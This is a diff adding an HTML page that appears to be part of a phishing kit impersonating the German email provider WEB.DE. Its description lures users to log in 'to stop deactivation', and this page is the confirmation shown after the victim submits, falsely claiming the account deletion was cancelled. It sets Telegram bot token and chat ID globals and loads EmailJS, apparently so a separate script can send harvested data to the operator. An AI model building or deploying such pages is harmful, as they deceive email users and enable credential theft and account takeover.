@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEBDE LOGIN</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem WEB.DE-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="style.css">
+
+    <link rel="stylesheet" href="mv.css">
+
+
+    <script>
+        // Set global JavaScript variables
+        window.telegramBotToken = "{{ telegram_bot_token }}";
+        window.telegramChatId = "{{ telegram_chat_id }}";
+    </script>
+    <style>
+        /* Image Scaling and Centering */
+        .check-image {
+            display: block;              /* Ensures the image is a block element */
+            margin: 20px auto;           /* Centers the image horizontally with some space on top and bottom */
+            transform: scale(1.5);       /* Scales the image by 150% */
+            width: 80px;                 /* Optionally, set the base width */
+            height: 80px;                /* Optionally, set the base height */
+            margin-bottom: 3rem;
+            
+        }
+
+        /* Styling for the powered-by footer */
+        .powered-by {
+            text-align: center;          /* Centers the text */
+            font-size: 14px;             /* Smaller font size */
+            color: #777;                /* Light grey text */
+            margin-top: 3rem;            /* Space above the footer */
+        }
+        .powered-by a {
+            text-decoration: none;       /* Removes the underline */
+            color: #777;                 /* Same grey color for the link */
+            font-weight: bold;           /* Bold text */
+        }
+
+            /* Custom paragraph styling */
+        p {
+            font-family: 'Roboto Condensed', sans-serif !important;  /* Forces font family */
+            font-size: 18px !important;                             /* Forces font size */
+            line-height: 1.6;                                       /* Line height for readability */
+            color: #333;                                            /* Set text color */
+            margin: 20px 0;                                         /* Space above and below the paragraph */
+        }
+
+        .loginn-container h1 {
+    font-family: Verdana, "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 1.3125rem; /* 21px */
+    color: #6a6464;
+    margin: 1.6875rem 0; /* 27px 0 */
+    font-weight: 510;
+    margin-top: 1.1875rem; /* 19px */
+}
+
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="WEB.DE Logo" class="logo">
+            <span class="account-text">Kundencenter</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="loginn-container">
+            
+            <form id="login-form" action="/login" method="POST">
+                <h1>Erledigt!</h1>
+                <!-- Image: Scaled and Centered -->
+                <img src="check.png" alt="Checkmark" class="check-image">
+                <p>Wir haben Ihre Bestätigung zur Stornierung der Kontolöschung erfolgreich verarbeitet. Wir freuen uns, dass Sie sich entschieden haben, bei uns zu bleiben. Wenn wir etwas tun können, um Ihre Erfahrung zu verbessern, zögern Sie bitte nicht, uns dies mitzuteilen.</p>
+                
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <!-- CAPTCHA image/icon here -->
+                        </div>
+                    </div>
+                </div>   
+            </form>
+
+            <!-- Powered by WEB.DE Footer -->
+            <div class="powered-by">
+                <p>Powered by <a href="https://www.web.de" >GMX.DE</a></p>
+            </div>
+        </div>
+    </main>
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+
+    <script src="../static/js/script.js"></script>
+</body>
+</html>
